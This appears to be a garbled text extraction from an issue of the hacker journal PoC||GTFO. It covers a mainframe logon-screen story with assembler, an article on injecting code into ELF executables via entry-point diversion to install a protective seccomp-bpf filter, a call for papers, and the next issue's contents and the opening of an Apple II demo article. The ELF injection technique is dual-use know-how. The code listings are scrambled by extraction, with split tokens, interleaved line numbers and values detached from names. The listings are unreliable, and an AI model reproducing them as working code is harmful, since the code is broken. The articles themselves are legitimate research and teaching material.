USSMSG MSG=02 ,BUFFER=(BUF02 , SCAN)
5
USSMSG MSG=03 ,BUFFER=(BUF03 , SCAN)
USSMSG MSG=04 ,BUFFER=(BUF04 , SCAN)
7
USSMSG MSG=05 ,BUFFER=(BUF05 , SCAN)
USSMSG MSG=06 ,BUFFER=(BUF06 , SCAN)
9
USSMSG MSG=08 ,BUFFER=(BUF08 , SCAN)
USSMSG MSG=10 ,BUFFER=(BUF10 , SCAN)
11
USSMSG MSG=11 ,BUFFER=(BUF11 , SCAN)
USSMSG MSG=12 ,BUFFER=(BUF12 , SCAN)
13
USSMSG MSG=14 ,BUFFER=(BUF14 , SCAN)
STDTRANS DC
X’ 0 0 0 1 0 2 0 3 0 4 4 0 0 6 0 7 0 8 0 9 0 A0B0C0D0E0F ’
15
DC
X’ 1 0 1 1 1 2 1 3 1 4 1 5 1 6 1 7 1 8 1 9 1 A1B1C1D1E1F ’
DC
X’ 2 0 2 1 2 2 2 3 2 4 2 5 2 6 2 7 2 8 2 9 2 A2B2C2D2E2F ’
17
DC
X’ 3 0 3 1 3 2 3 3 3 4 3 5 3 6 3 7 3 8 3 9 3 A3B3C3D3E3F ’
DC
X’ 4 0 4 1 4 2 4 3 4 4 4 5 4 6 4 7 4 8 4 9 4 A4B4C4D4E4F ’
19
DC
X’ 5 0 5 1 5 2 5 3 5 4 5 5 5 6 5 7 5 8 5 9 5 A5B5C5D5E5F ’
DC
X’ 6 0 4 0 6 2 6 3 6 4 6 5 6 6 6 7 6 8 6 9 6 A6B6C6D6E6F ’
21
DC
X’ 7 0 7 1 7 2 7 3 7 4 7 5 7 6 7 7 7 8 7 9 7 A7B7C7D7E7F ’
DC
X’ 8 0 C1C2C3C4C5C6C7C8C98A8B8C8D8E8F ’
23
DC
X’ 9 0 D1D2D3D4D5D6D7D8D99A9B9C9D9E9F ’
DC
X’ A0A1E2E3E4E5E6E7E8E9AAABACADAEAF ’
25
DC
X’ B0B1B2B3B4B5B6B7B8B9BABBBCBDBEBF ’
DC
X’ C0C1C2C3C4C5C6C7C8C9CACBCCCDCECF ’
27
DC
X’ D0D1D2D3D4D5D6D7D8D9DADBDCDDDEDF’
DC
X’ E0E1E2E3E4E5E6E7E8E9EAEBECEDEEEF ’
29
DC
X’ F0F1F2F3F4F5F6F7F8F9FAFBFCFDFEFF ’
END
USSEND
3
I shut down my computer, ordered an Uber, and
headed out of the office.
A car pulled up as I looked up from my phone.
This wasn’t my Uber, this was a Tesla, a black Tesla.
The back door opened. Rico sat in the back, his one
eye covered with a patch, gave him the look of a
pirate, as did the gun he had pointed at my face.
“Get in,” he said, motioning with the large revolver.
Having no other option, I shrugged and got in the
back of this Tesla-and wondered how much a no-
show was gonna cost me on Uber. The Tesla sped
off, and slammed me in to the back of my seat.
After a few moments of silence, “Just who the
fuck do you think you are?” Rico asked.
“Hey, Rico, all I wanted to do was make a nice lo-
gon screen for my mainframe.” I quipped. This vis-
ibly upset Rico. The driver quietly snickered in the
52front seat, then said “This guy thinks he’s a sysprog
now?”
“Shut up Oren!” Rico turned to me, “It works
like this: we control the information. We decide
who knows what. You’re wastin’ everyone’s time
over some aesthetic changes. The very fact that you
phrase it as ‘logon screen’ means you’re not ready
to know this information!”
I stammered a response, “Look, I don’t get what
the big deal is, if you don’t want to help who cares?”
and I showed him a screenshot of my mainframe.
This was not a good idea. Rico’s face turned
bright red. “BULLSHIT! You’ve wasted plenty of
people’s time! Tommy, Dave, John. You should’ve
gone back and read the manuals, like I had to. All
14,000 pages. Instead, you want a short cut. A
hand out. Well, sonny, nothing comes easy. There
is no possible way your system didn’t come with cus-
tomization rules, documentation and changes. That
just not how it’s done!”
I realized at this point Rico had never heard
about the fact that you can emulate your own main-
frame at home. 30 Oren, turned his head to look at
me, “Yeah, there ain’t no way you get to run your
own system and do what you want all willy-nilly.”
I noticed the red light before Oren and Rico, and
got ready to put a dumb plan in to action. Oren
slammed on the brakes and sent Rico flying in to the
seat in front of him. Why don’t bad guys ever wear
their seatbelts? While Rico was slightly stunned, I
lunged and wrestled the gun free from his hands. At
the same time, I grabbed my own pea shooter and
pointed one each at Oren and Rico.
“Enough of this shit,” I yelled, “you’re too late
anyway, I’ve already built and replaced my USS Ta-
ble.” I made sure to use the correct terminology
now. “I already shot and missed you once today
Rico, I won’t miss a second time. Now let me out of
this car!”
“Ok, ok. Cool it.” said Oren as he slowed the
car. Rico just sat and stewed.
I stepped out of the car. “This isn’t the last
you’ve heard from us!” Rico yelled, and the black
Tesla sped off in to the night.
He was right, of course. It wouldn’t be the last
time I clashed with the EF gang and lived to tell
about it.
30 https://www.ibm.com/us-en/marketplace/z-systems-development-test-environment
53With that final piece of the puzzle I gave Bigen-
dian Smalls a short demo.
–——–
———
—–—–
I couldn’t believe that was six years ago. Bigen-
dian knew to reach out to me because I had done
some nice screens for him in the past. My skills at
making EBCDIC art since then had improved vastly.
Then I hit <enter>, and it all came together.
Thanks to another meeting years later with Big
John, I learned you can add lines and graphics to
make shapes using the rarely documented SFE GE
SHAPE (\x08) command. At this point, I had the
three-headed beast as a rough idea in my head what
I wanted the screen to look like. But, I needed a
way to animate the Windows 10 update nag screen.
Like a small dog running in to a screen door, it
hit me. I could use the MSGs and an AIF to display
the nag screen!
You see, when you first connect, that’s a MSG10
screen. If you hit enter, to the user it appears as
though the screen just refreshed. But what’s really
happening is VTAM loads a MSG02 screen. Because
you entered an invalid command (nothing). I could
use an AIF statement to only show the Windows 10
nag screen if an invalid command was entered.
Above, where I declared the colors, I could also
declare some shapes:
1 &UPRIGHT
&DOWNRIGHT
3 &UPLEFT
&DOWNLEFT
5 &HBAR
&VBAR
SETC
SETC
SETC
SETC
SETC
SETC
“Wow, that’s really awesome.” he replied over
ICQ. It sure was.
’X’ ’ 0 8 D5 ’ ’ ’
’X’ ’ 0 8 D4 ’ ’ ’
’X’ ’ 0 8 C5 ’ ’ ’
’X’ ’ 0 8 C4 ’ ’ ’
’X’ ’ 0 8 A2 ’ ’ ’
’X’ ’ 0 8 8 5 ’ ’ ’
And, with the help of Tommy’s table, the one
that gave me the coordinates for screen positions,
and Big John’s graphics, I could overlay the nag
box on the screen. But only if the MSG is type 02.
See Figure 21.
542
4
6
8
10
12
14
16
18
20
22
24
26
28
30
32
34
36
38
40
42
44
46
48
50
52
54
56
58
60
62
64
66
68
70
72
74
76
78
80
82
84
86
AIF ( ’&MSG’ NE ’ 0 2 ’ ) . SKIP
TOP BAR
DC
X’ 1 1 C76D ’
DC
&COLOR&BG&TURQ
DC
&UPLEFT
DC
52&HBAR
DC
&UPRIGHT
∗ BOX WALLS
DC
X’ 1 1 C87D ’
DC
&COLOR&BG&TURQ
DC
&VBAR
DC
52C ’ ’
DC
X’ 1 1 C9F3 ’
DC
&VBAR
DC
X’ 1 1 4 A4D ’
DC
&COLOR&BG&TURQ
DC
&VBAR
DC
52C ’ ’
DC
X’ 1 1 4 BC3 ’
DC
&VBAR
DC
X’ 1 1 4 B5D ’
DC
&COLOR&BG&TURQ
DC
&VBAR
DC
52C ’ ’
DC
X’ 1 1 4 CD3 ’
DC
&VBAR
DC
X’ 1 1 4 C6D ’
DC
&COLOR&BG&TURQ
DC
&VBAR
DC
52C ’ ’
DC
X’ 1 1 4 DE3 ’
DC
&VBAR
DC
X’ 1 1 4 D7D ’
DC
&COLOR&BG&TURQ
DC
&VBAR
DC
52C ’ ’
DC
X’ 1 1 0 3 B3 ’
DC
&VBAR
DC
X’ 1 1 4 F4D ’
DC
&COLOR&BG&TURQ
DC
&VBAR
DC
52C ’ ’
DC
X’ 1 1 0 4 0 3 ’
DC
&VBAR
DC
X’ 1 1 5 0 5D’
DC
&COLOR&BG&TURQ
DC
&VBAR
DC
52C ’ ’
DC
X’ 1 1 0 4 5 3 ’
DC
&VBAR
DC
X’ 1 1 D16D ’
DC
&COLOR&BG&TURQ
DC
&VBAR
DC
52C ’ ’
DC
X’ 1 1 0 4 A3 ’
DC
&VBAR
DC
X’ 1 1 D27D ’
DC
&COLOR&BG&TURQ
DC
&VBAR
DC
52C ’ ’
DC
X’ 1 1 0 4 F3 ’
DC
X’ 0 8 8 5 ’
∗
BOTTOM BAR
DC
X’ 1 1 0 5 0D’
DC
&COLOR&BG&TURQ
DC
&DOWNLEFT
DC
52&HBAR
DC
&DOWNRIGHT
∗ INSIDE BOX
DC
X’ 1 1 4 A50 ’
DC
&COLOR&BG&TURQ
DC C ’ Windows 1 0 ’
DC
X’ 1 1 4 CF1 ’
DC C ’ Don ’ ’ t m i s s o u t . F r e e
∗ ACCEPT LINE
DC
X’ 1 1 5 0 E3 ’
DC C ’ x Upgrade now
∗ UNDERLINES
DC
X’ 1 1 5 0 E2 ’
DC
X’ 2 9 0 3 4 1 F442F5C0C8 ’
DC
C’ x ’
DC
&COLOR&BG&TURQ
DC
X’ 1 1 5 0 7 A’
DC
X’ 2 9 0 3 4 1 F442F5C0C8 ’
DC
X’ 4 0 ’
DC
&COLOR&BG&TURQ
. SKIP
ANOP
∗
SBA ,
1050
ROW 10 COL 13
SBA , ROW 11 COL 13
SBA , ROW 11 COL 66
SBA , ROW 11 COL 13
SBA , ROW 11 COL 66
SBA , ROW 11 COL 13
SBA , ROW 11 COL 66
SBA , ROW 11 COL 13
SBA , ROW 11 COL 66
SBA , ROW 11 COL 13
SBA , ROW 11 COL 66
SBA , ROW 12 COL 13
SBA , ROW 12 COL 66
SBA , ROW 13 COL 13
SBA , ROW 13 COL 66
SBA , ROW 14 COL 13
SBA , ROW 14 COL 66
SBA , ROW 15 COL 13
SBA , ROW 15 COL 66
SBA , ROW 16 COL 13
SBA , ROW 11 COL 16
SBA , ROW 13 COL 16
upgrade o f f e r ends July
29. ’
SBA , ROW 15 COL 18
Accept f r e e o f f e r ’
SBA , ROW 15 COL 18
SFE , UNPROTECTED/UNDL/TURQ
SBA , ROW 15 COL 42
SFE , UNPROTECTED/UNDL/TURQ
Figure 21. Upgrade Offer
5517:09
Protecting ELF Files by Infecting Them
by Leandro “acidx” Pereira
Caveats
Writing viruses is a sure way to learn not only
the intricacies of linkers and loaders, but also tech-
niques to covertly add additional code to an existing
executable. Using such clever techniques to wreck
havoc is not very neighborly, so here’s a way to have
some fun, by injecting additional code to tighten the
security of an ELF executable.
Since there’s no need for us to hide the payload,
the injection technique used here is pretty rudimen-
tary. We find some empty space in a text seg-
ment, divert the entry point to that space, run a
bit of code, then execute the program as usual. Our
payload will not delete files, scan the network for
vulnerabilities, self-replicate, or anything nefarious;
rather, it will use seccomp-bpf to limit the system
calls a process can invoke.
By design, seccomp-bpf is unable to read memory;
this means that string arguments, such as in the
open() syscall, cannot be verified. It would other-
wise be a race condition, as memory could be mod-
ified after the filter had approved the system call
dispatch, thwarting the mechanism.
It’s not always easy to determine which system
calls a program will invoke. One could run it under
strace(1), but that would require a rather high
test coverage to be accurate. It’s also likely that
the standard library might change the set of system
calls, even as the program’s local code is unchanged.
Grouping system calls by functionality sets might be
a practical way to build the white list.
Which system calls a process invokes might
change depending on program state. For instance,
during initialization, it is acceptable for a program
to open and read files; it might not be so after the
initialization is complete.
Also, seccomp-bpf filters are limited in size.
This makes it more difficult to provide fine-grained
filters, although eBPF maps 31 could be used to
shrink this PoC so slightly better filters could be
created.
Scripting like a kid
Filters for seccomp-bpf are installed using the
prctl(2) system call. In order for the filter to be
effective, two calls are necessary. The first call will
forbid changes to the filter during execution, while
the second will actually install it.
The first call is simple enough, as it only has nu-
meric arguments. The second call, which contains
the BPF program itself, is slightly trickier. It’s not
possible to know, beforehand, where the BPF pro-
gram will land in memory. This is not such a big
issue, though; the common trick is to read the stack,
knowing that the call instruction on x86 will store
the return address on the stack. If the BPF program
is right after the call instruction, it’s easy to obtain
its address from the stack.
31 man
2 bpf
561 ;
...
3 jmp f i l t e r
5 apply_filter :
; rdx c o n t a i n s t h e addr o f t h e BPF program
7
pop rdx
9
11
13
;
...
; 32 b i t JMP p l a c e h o l d e r t o t h e e n t r y p o i n t
db 0 xe9
dd 0 x00000000
15 f i l t e r :
call apply_filter
17
bpf :
19
bpf_stmt { bpf_ld+bpf_w+bpf_abs } , 4
; r e m a i n d e r o f t h e BPF p a y l o a d
The BPF virtual machine has its own instruc-
tion set. Since the shell code is written in assembly,
it’s easier to just define some macros for each BPF
bytecode instruction and use them.
bpf_ld equ 0 x00
2 bpf_w
equ 0 x00
bpf_abs equ 0 x20
4 bpf_jmp equ 0 x05
bpf_jeq equ 0 x10
6 bpf_k
equ 0 x00
b p f _ r e t equ 0 x06
8
seccomp_ret_allow
10 seccomp_ret_trap
audit_arch_x86_64
12
%macro bpf_stmt 2
14
dw (%1)
db ( 0 )
16
db ( 0 )
dd (%2)
18 %endmacro
equ 0 x 7 f f f 0 0 0 0
equ 0 x00030000
equ 0 x c 0 0 0 0 0 3 e
; BPF s t a t e m e n t
20 %macro bpf_jump 4 ; BPF jump
dw (%1)
22
db (%2)
db (%3)
24
dd (%4)
%endmacro
26
%macro s c _ a l l o w 1 ; Allow s y s c a l l
28
bpf_jump {bpf_jmp+bpf_jeq+bpf_k } , 0 , 1 , %1
bpf_stmt { b p f _ r e t+bpf_k } , seccomp_ret_allow
30 %endmacro
5758A Makefile takes care of assembling the pay-
load, formatting it in a way that it can be included
in the C source, building a simple guinea pig pro-
gram twice, then infecting one of the executables.
Complete source code is available. 34
By listing all the available system calls from
syscall.h, 32 it’s trivial to write a BPF filter that
will deny the execution of all system calls, except
for a chosen few.
bpf_stmt { bpf_ld+bpf_w+bpf_abs } , 4
2 bpf_jump {bpf_jmp+bpf_jeq+bpf_k } , 0 , 1 ,
audit_arch_x86_64
bpf_stmt { bpf_ld+bpf_w+bpf_abs } , 0
4 sc_allow
0
; read (2)
sc_allow
1
; write (2)
6 sc_allow
2
; open ( 2 )
sc_allow
3
; close (2)
8 sc_allow
5
; f s t a t (2)
sc_allow
9
; mmap( 2 )
10 s c _ a l l o w 10
; mprotect ( 2 )
s c _ a l l o w 11
; munmap ( 2 )
12 s c _ a l l o w 12
; brk ( 2 )
s c _ a l l o w 21
; access (2)
14 s c _ a l l o w 158
; prctl (2)
bpf_stmt { b p f _ r e t+bpf_k } , seccomp_ret_trap
1 #include <s t d i o . h>
#include <s y s / s o c k e t . h>
3
i n t main ( i n t a r g c , char ∗ a r g v [ ] ) {
5
i f ( argc < 2) {
p r i n t f ( " no s o c k e t c r e a t e d \n" ) ;
7
} else {
i n t f d=s o c k e t (AF_INET, SOCK_STREAM, 6 ) ;
9
p r i n t f ( " c r e a t e d s o c k e t , f d = %d\n" , f d ) ;
}
11 }
Testing & Conclusion
The output in Figure 22 is an excerpt of a system
call trace, from the moment that the seccomp-bpf
filter is installed, to the moment the process is killed
by the kernel with a SIGSYS signal.
Infecting
One of the nice things about open source being ubiq-
uitous today is that it’s possible to find source code
for the most unusual things. This is the case of
ELFKickers, a package that contains a bunch of lit-
tle utilities to manipulate ELF files. 33
I’ve modified the infect.c program from that
collection ever so slightly, so that the placeholder
jmp instruction is patched in the payload and the
entry point is correctly calculated for this kind of
payload.
Happy hacking!
32 echo
"#include <sys/syscall.h>" | cpp -dM | grep ’ˆ#define __NR_’
clone https://github.com/BR903/ELFkickers || unzip pocorgtfo17.pdf ELFkickers-3.1.tar.gz
34 unzip pocorgtfo17.pdf infect.zip
33 git
1 p r c t l (PR_SET_NO_NEW_PRIVS, 1 , 0 , 0 , 0 ) = 0
p r c t l (PR_SET_SECCOMP, SECCOMP_MODE_FILTER, { l e n =30 , f i l t e r =0x400824 } ) = 0
3 s o c k e t (AF_INET, SOCK_STREAM, IPPROTO_TCP) = 41
−−− SIGSYS { s i _ s i g n o=SIGSYS , s i _ c o d e=SYS_SECCOMP, s i _ c a l l _ a d d r=0x 7 f 2 d 0 1 a a 1 9 e 7 ,
5
s i _ s y s c a l l=__NR_socket , s i _ a r c h=AUDIT_ARCH_X86_64} −−−
+++ k i l l e d by SIGSYS ( c o r e dumped ) +++
7 [1]
27536 i n v a l i d system c a l l ( c o r e dumped )
strace ./ hello
Figure 22. Excerpt of strace(1) output when running hello.c.
5917:10
Laphroaig’s Home for Unwanted Polyglots and 0day
from the desk of Pastor Manul Laphroaig,
Tract Association of PoCkGTFO.
Dearest neighbor,
Our scruffy little gang started this самиздат
journal a few years back because we didn’t much like
the academic ones, but also because we wanted to
learn new tricks for reverse engineering. We wanted
to publish the methods that make exploits and poly-
glots possible, so that folks could learn from each
other. Over the years, we’ve been blessed with the
privilege of editing these tricks, of seeing them early,
and of seeing them through to print.
Now it’s your turn to share what you know, that
nifty little truth that other folks might not yet know.
It could be simple, or a bit advanced. Whatever
your nifty tricks, if they are clever, we would like to
publish them.
Do this: write an email in 7-bit ASCII telling
our editors how to reproduce ONE clever, techni-
cal trick from your research. If you are uncertain of
your English, we’ll happily translate from French,
Russian, Southern Appalachian, and German.
Like an email, keep it short. Like an email, you
should assume that we already know more than a
bit about hacking, and that we’ll be insulted or—
WORSE!—that we’ll be bored if you include a long
tutorial where a quick explanation would do.
Teach me how to falsify a freshman physics ex-
periment by abusing floating-point edge cases. Show
me how to enumerate the behavior of all illegal in-
structions in a particular implementation of 6502,
or how to quickly blacklist any byte from amd64
shellcode. Explain to me how shellcode in Wine or
ReactOS might be simpler than in real Windows.
Don’t tell us that it’s possible; rather, teach us
how to do it ourselves with the absolute minimum
of formality and bullshit.
Like an email, we expect informal language and
hand-sketched diagrams. Write it in a single sit-
ting, and leave any editing for your poor preacher-
man to do over a bottle of fine scotch. Send this
to pastor@phrack org and hope that the neighborly
Phrack folks—praise be to them!—aren’t man-in-the-
middling our submission process.
Yours in PoC and Pwnage,
Pastor Manul Laphroaig, T G S B
60P o C G T F O
roof
oncept or
et
f
ut
he
uck
Pastor Manul Laphroaig’s
Montessori Soldering School and
Stack Smashing Academy
Application Fee:
nc ept
un
зд ат
Са ми
G T
o
f
Co
r
for Youngsters Gifted and Not
ded
8
13679
56
Рукописи не горят. pocorgtfo18.pdf. Compiled on June 23, 2018.
0, $0 USD, $0 AUD, 0 RSD, 0 SEK, $50 CAD, 6 × 10 29 Pengő (3 × 10 8 Adópengő), 100 JPC.18:02 An 8 Kilobyte Mode 7 Demo for the Apple II . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . p. 4
18:03 Fun Memory Corruption Exploits for Kids with Scratch! . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . p. 10
18:04 Concealing ZIP Files in NES Cartridges . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . p. 17
18:05 House of Fun; or, Heap Exploitation against GlibC in 2018 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . p. 22
18:06 Read Only Relocations for Static ELF . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . p. 37
18:07 Remotely Exploiting a TetriNET Server . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . p. 48
18:08 A Guide to KLEE LLVM Execution Engine Internals . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . p. 51
18:09 Reversing the Sandy Bridge DDR3 Scrambler with Coreboot . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . p. 58
18:10 Easy SHA-1 Colliding PDFs with PDFLaTeX . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . p. 63
Legal Note: Printing this to hardcopy prevents the electronic edition from smelling like burning paper.
We’ll be printing a few thousand of our own, but we also insist that you print it by laserjet or typewriter
самиздат, giving it away to friends and strangers. Sneak it into a food delivery rack at your local dive bar,
or hide it between two books on the shelves of your university library.
Reprints: Bitrot will burn libraries with merciless indignity that even Pets Dot Com didn’t deserve. Please
mirror—don’t merely link!—pocorgtfo18.pdf and our other issues far and wide, so our articles can help fight
the coming flame deluge. Not running one of our own, we like the following mirrors.
https://unpack.debug.su/pocorgtfo/
https://www.alchemistowl.org/pocorgtfo/
https://pocorgtfo.hacke.rs/
https://www.sultanik.com/pocorgtfo/
Technical Note: This file, pocorgtfo18.pdf, is valid as a PDF, ZIP, and HTML. It is available in two
different variants, but they have the same SHA-1 hash.
Printing Instructions: Pirate print runs of this journal are most welcome! PoCkGTFO is to be printed
duplex, then folded and stapled in the center. Print on A3 paper in Europe and Tabloid (11” x 17”) paper
in Samland, then fold to get a booklet in A4 or Letter size. Secret volcano labs in Canada may use P3
(280 mm x 430 mm) if they like, folded to make P4. The outermost sheet should be on thicker paper to
form a cover.
# This is how to convert an issue for duplex printing.
sudo apt-get install pdfjam
pdfbook --short-edge --vanilla --paper a3paper pocorgtfo18.pdf -o pocorgtfo18-book.pdf
Man of The Book
Manul Laphroaig
Editor of Last Resort
Melilot
TEXnician
Evan Sultanik
Editorial Whipping Boy
Jacob Torrey
Funky File Supervisor
Ange Albertini
Assistant Scenic Designer
Philippe Teuwen
Scooby Bus Driver
Ryan Speers
with the good assistance of
Virtual Machine Mechanic
Dan Kaminsky
218:01
I thought I turned it on, but I didn’t.
Neighbors, please join me in reading this nine-
teenth release of the International Journal of Proof
of Concept or Get the Fuck Out, a friendly little
collection of articles for ladies and gentlemen of dis-
tinguished ability and taste in the field of reverse
engineering and the study of weird machines. This
release is a gift to our fine neighbors in Montréal.
Vi Grey was reading PoCkGTFO 14:12, and a
nifty thought occurred. Why not merge a ZIP file
into an NES cartridge itself, and not just its iNES
emulator file? See page 17 for all the practical de-
tails.
If you enjoyed Yannay Livneh’s article on the
VLC heap from PoCkGTFO 16:6, turn to page 22
for his notes on the House of Fun, exploiting glibc
heaps in the year 2018.
Ryan O’Neill, whom you might know as Elfmas-
ter, has been playing around with static linking of
ELF files on Linux. You certainly know that static
files are handy for avoiding missing libraries, but
did you know that static linking breaks ASLR and
RELRO defenses, that the global offset table might
still be writable? See page 37 for his notes on pro-
ducing a static executable that does include these
defenses.
TetriNET is a multiplayer clone of Tetris that
St0rmCat released in 1997. On page 48, John Laky
and Kyle Hanslovan give us a remote code execution
exploit for that game just twenty years too late for
anyone to expect a patch.
When performing a cold boot attack, it’s impor-
tant to recover not just the contents of memory but
also to descramble it, and this scrambler is often
poorly documented on modern systems. On page
58, Nico Heijningen patches Coreboot to reverse en-
gineer the scrambler of the DDR3 controller on In-
tel’s Sandy Bridge processors.
Ange Albertini was one of the fine authors of
the SHAttered attack that demonstrated a practi-
cal SHA-1 collision. On page 63, he shows how to
reuse that same colliding block to substitute an arbi-
trary image in a larger document, conveniently gen-
erated by PDFL A TEX. As is the tradition in most
of Ange’s articles, pocorgtfo18.pdf uses this tech-
nique to place a stamp on the front cover. We’ll re-
lease two variants, but because they have the same
SHA-1 hash, we politely ask mirrors to include the
MD5 hashes as well.
On page 64, the last page, we pass around the
collection plate. Our church has no interest in bit-
coins or wooden nickels, but we’d love your donation
of a reverse engineering story. Please send some our
way.
If you are missing the first eighteen issues, we
suggest asking a neighbor who picked up a copy of
the first in Vegas, the second in São Paulo, the third
in Hamburg, the fourth in Heidelberg, the fifth in
Montréal, the sixth in Las Vegas, the seventh from
his parents’ inkjet printer during the Thanksgiv-
ing holiday, the eighth in Heidelberg, the ninth in
Montréal, the tenth in Novi Sad or Stockholm, the
eleventh in Washington D.C., the twelfth in Heidel-
berg, the thirteenth in Montréal, the fourteenth in
São Paulo, San Diego, or Budapest, the fifteenth
in Canberra, Heidelberg, or Miami, the sixteenth
release in Montréal, New York, or Las Vegas, the
seventeenth release in São Paulo or Budapest, or
the eighteenth release in Leipzig or Washington,
D.C. Two collected volumes are available through
No Starch Press, wherever fine books are sold.
After our paper release, and only when quality
control has been passed, we will make an electronic
release named pocorgtfo18.pdf. It is a valid PDF
document, HTML website, and ZIP archive filled
with fancy papers and source code. You will find it
available in two different variants, but they have the
same SHA-1 hash.
Nintendo’s SNES platform was famous for its
Mode 7, a video mode in which a background im-
age could be rotated and stretched to create a faux
3D effect. This didn’t exist for the Apple ][, so on
page 4 Vincent Weaver describes his recreation of
the technique in software as a recent demo coding
exercise.
Many of us began our careers in reverse engineer-
ing through line numbered BASIC, and we fondly
remember the peek and poke commands that let
us do sophisticated things with a child’s language.
On page 10, Kev Sheldrake extends the Scratch lan-
guage so that his son can experiment with memory
corruption exploits.
318:02
An 8 Kilobyte Mode 7 Demo for the Apple II
by Vincent M. Weaver
While making an inside-joke filled game for my
favorite machine, the Apple ][, I needed to cre-
ate a Final-Fantasy-esque flying-over-the-planet se-
quence. I was originally going to fake this, but why
fake graphics when you can laboriously spend weeks
implementing the effect for real. It turns out the Ap-
ple ][ is just barely capable of generating the effect
in real time.
Once I got the code working I realized it would be
great as part of a graphical demo, so off on that tan-
gent I went. This turned out well, despite the fact
that all I knew about the demoscene I had learned
from a few viewings of the Future Crew Second Re-
ality demo combined with dimly remembered Com-
modore 64 and Amiga usenet flamewars.
While I hope you enjoy the description of the
demo and the work that went into it, I suspect
this whole enterprise is primarily of note due to the
dearth of demos for the Apple ][ platform. For those
of you who would like to see a truly impressive Ap-
ple ][ demo, I would like to make a shout out to
FrenchTouch whose works put this one to shame.
chips. Each sound chip provides three channels of
square waves as well as noise and envelope effects.
Graphics:
It is hard to imagine now, but the Apple ][ had
nice graphics for its time. Compared to later com-
petitors, however, it had some limitations: No hard-
ware sprites, user-defined character sets, blanking
interrupts, palette selection, hardware scrolling, or
even a linear framebuffer! It did have hardware page
flipping, at least.
The hi-res graphics mode is a complex mess
of NTSC hacks by Woz. You get approximately
280x192 resolution, with 6 colors available. The col-
ors are NTSC artifacts with limitations on which
colors can be next to each other, in blocks of 3.5
pixels. There is plenty of fringing on edges, and col-
ors change depending on whether they are drawn
at odd or even locations. To add to the madness,
the framebuffer is interleaved in a complex way, and
pixels are drawn least-significant-bit first. (All of
this to make DRAM refresh better and to shave a
few 7400 series logic chips from the design.) You
do get two pages of graphics, Page 1 is at $2000
and Page 2 at $4000. 1 Optionally four lines of text
can be shown at the bottom of the screen instead of
graphics.
The lo-res mode is a bit easier to use. It pro-
vides 40 × 48 blocks, reusing the same memory as
the 40×24 text mode. (As with hi-res you can switch
to a 40 × 40 mode with four lines of text displayed
at the bottom.) Fifteen unique colors are available,
plus a second shade of grey. Again the addresses are
interleaved in a non-linear fashion. Lo-res Page 1 is
at $400 and Page 2 is at $800.
Some amazing effects can be achieved by cycle
counting, reading the floating bus, and racing the
beam while toggling graphics modes on the fly.
The Hardware
CPU, RAM and Storage:
The Apple ][ was introduced in 1977 with a 6502
processor running at roughly 1.023MHz. Early mod-
els only shipped with 4k of RAM, but in later years,
48k, 64k and 128k systems became common. While
the demo itself fits in 8k, it decompresses to a larger
size and uses a full 48k of RAM; this would have
been very expensive in the seventies.
In 1977 you would probably be loading this from
cassette tape, as it would be another year before
Woz’s single-sided 5 14 ” Disk II came around. With
the release of Apple DOS3.3 in 1980, it offered 140k
of storage on each side.
Sound:
The only sound available in a stock Apple ][ is
a bit-banged speaker. There is no timer interrupt;
if you want music, you have to cycle-count via the
CPU to get the waveforms you needed.
The demo uses a Mockingboard soundcard, first
introduced in 1981. This board contains dual AY-3-
8910 sound generation chips connected via 6522 I/O
1 On
6502 systems hexadecimal values are traditionally indicated by a dollar sign.
4Development Toolchain
I do all of my coding under Linux, using the ca65
assembler from the cc65 project. I cross-compile the
code, constructing AppleDOS 3.3 disk images using
custom tools I have written. I test first in emula-
tion, where AppleWin under Wine is the easiest to
use, but until recently MESS/MAME had cleaner
sound.
Once the code appears to work, I put it on a
USB stick and transfer to actual hardware using a
CFFA3000 disk emulator installed in an Apple IIe
platinum edition.
Figure 1. Colorful View of Executable Code
Bootloader
-------------
ROM/IO
|
-------------
|
|
| Uncompressed|
| Code/Data
|
|
|
-------------
| Compressed |
|
Code
|
-------------
|
free
|
-------------
|
Scroll
|
|
Data
|
-------------
| Multiply
|
|
Tables
|
-------------
| LORES pg 3 |
-------------
| LORES pg 2 |
-------------
| LORES pg 1 |
-------------
|free/vectors |
-------------
|
stack
|
-------------
|
zero pg
|
-------------
An Applesoft BASIC “HELLO” program loads the
binary automatically at bootup. This does not
count towards the executable size, as you could man-
ually BRUN the 8k machine-language program if
you wanted.
To make the loading time slightly more interest-
ing the HELLO program enables graphics mode and
loads the program to address $2000 (hi-res page1).
This causes the display to filled with the color-
ful pattern corresponding to the compressed image.
(Figure 1.) This conveniently fills all 8k of the dis-
play RAM, or would have if we had poked the right
soft-switch to turn off the bottom four lines of text.
After loading, execution starts at address $2000.
$ffff
|
$c000
$4000
Decompression
$2000
The binary is encoded with the LZ4 algorithm. We
flip to hi-res Page 2 and decompress to this region
so the display now shows the executable code.
The 6502 size-optimized LZ4 decompression
code was written by qkumba (Peter Ferrie). 2 The
program and data decompress to around 22k start-
ing at $4000. This overwrites parts of DOS3.3, but
since we are done with the disk this is no problem.
If you look carefully at the upper left corner of
the screen during decompression you will see my tri-
angular logo, which is supposed to evoke my VMW
initials. To do this I had to put the proper bit pat-
tern inside the code at the interleaved addresses of
$4000, $4400, $4800, and $4C00. The image data
at $4000 maps to (mostly) harmless code so it is left
in place and executed.
$1c00
$1800
$1000
$0c00
$0800
$0400
$0200
$0100
$0000
Figure 2. Memory Map
2 http://pferrie.host22.com/misc/appleii.htm
5mode. There are “holes” in the address range that
are not displayed, and various pieces of hardware
can use these as scratchpad memory. This means
just overwriting the whole 1k with data might not
work out well unless you know what you are doing.
Our RLE decompression code skips the holes just to
be safe.
SCROLL TEXT: The title screen has scrolling
text at the bottom. This is nothing fancy, the text
is in a buffer off screen and a 40 × 4 chunk of RAM
is copied in every so many cycles.
You might notice that there is tearing/jitter in
the scrolling even though we are double-buffering
the graphics. Sadly there is no reliable cross-
